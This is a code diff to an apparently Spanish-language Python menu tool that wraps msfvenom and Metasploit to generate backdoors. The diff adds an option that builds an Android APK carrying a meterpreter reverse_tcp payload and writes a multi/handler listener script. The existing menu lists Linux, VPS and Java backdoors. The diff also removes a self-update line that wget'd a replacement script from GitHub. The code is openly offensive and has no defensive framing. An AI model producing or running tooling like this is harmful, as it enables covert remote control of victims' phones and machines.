@@ -4,8 +4,6 @@ import time
 
 #sys.stdout.write("\033[1;31m")
 while True:
-    os.system("rm actualizar.py")
-    os.system("wget https://raw.githubusercontent.com/cipotemanx/ciporat/master/actualizar.py")
     os.system('cls' if os.name == 'nt' else 'clear')
     cyan = '\e[0;36m'
     green = '\e[0;34m'
@@ -60,7 +58,8 @@ while True:
         print("4 - Backdoor-Linux con meterpreter (reverse_https)")
         print("5 - Backdoor-VPS con meterpreter (reverse_tcp)")
         print("6 - Backdoor-Java con meterpreter (reverse tcp)")
-        print("7 - Salir al menu principal\n")
+        print("7 - Backdoor-Android con meterpreter (reverse_tcp)")
+        print("8 - Salir al menu principal\n")
         msfvenom = input("Selecciona una opcion: ")
         if msfvenom == "1":
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -183,6 +182,28 @@ while True:
             for i in range(1):
                 f.write("use exploit/multi/handler\n")
                 f.write("set payload java/meterpreter/reverse_tcp\n")
+                f.write("set lhost 0.0.0.0\n")
+                f.write("set lport {}\n".format(lport))
+                f.write("exploit")
+            f.close()
+            if salir == "s":
+                os.system("msfconsole -r meta.rc")
+            else:
+                continue
+
+        elif msfvenom == "7":
+            os.system('cls' if os.name == 'nt' else 'clear')
+            lhost = input("Escribe la dirección ip o dns: ")
+            lport = int(input("Escribe el puerto: "))
+            output = input("Que nombre le quieres dar al archivo?: ")
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print("\nCreando exploit...")
+            os.system("msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} -o {}.apk".format(lhost, lport, output))
+            salir = input("Desea abrir el listener de metasploit? (s/n): ")
+            f = open("meta.rc", "w+")
+            for i in range(1):
+                f.write("use exploit/multi/handler\n")
+                f.write("set payload android/meterpreter/reverse_tcp\n")
                 f.write("set lhost 0.0.0.0\n")
                 f.write("set lport {}\n".format(lport))
                 f.write("exploit")
